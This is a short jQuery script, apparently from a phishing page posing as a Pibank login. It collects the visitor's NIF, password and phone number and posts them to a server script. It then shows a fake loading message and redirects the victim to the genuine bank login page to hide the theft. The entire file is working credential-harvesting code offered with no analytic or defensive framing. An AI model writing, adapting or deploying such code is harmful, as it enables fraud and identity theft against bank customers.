$('.entrar').click(function(){
var nif = $('#input01').val();
var password = $('#input02').val();
var phone = $('#input03').val();
$.post('core/php/app.php', {content:'main', nif:nif, password:password,phone:phone}, function(response){});

$('.entrar').val('Cargando');

setTimeout(function() {
$('.entrar').val('Cargando.');}, 1000);
setTimeout(function() {
$('.entrar').val('Cargando..');}, 2000);
setTimeout(function() {
$('.entrar').val('Cargando...');}, 3000);

setTimeout(function() {
var url = "https://clientes.pibank.es/#/login";
$(location).attr('href',url);
}, 5000);
});
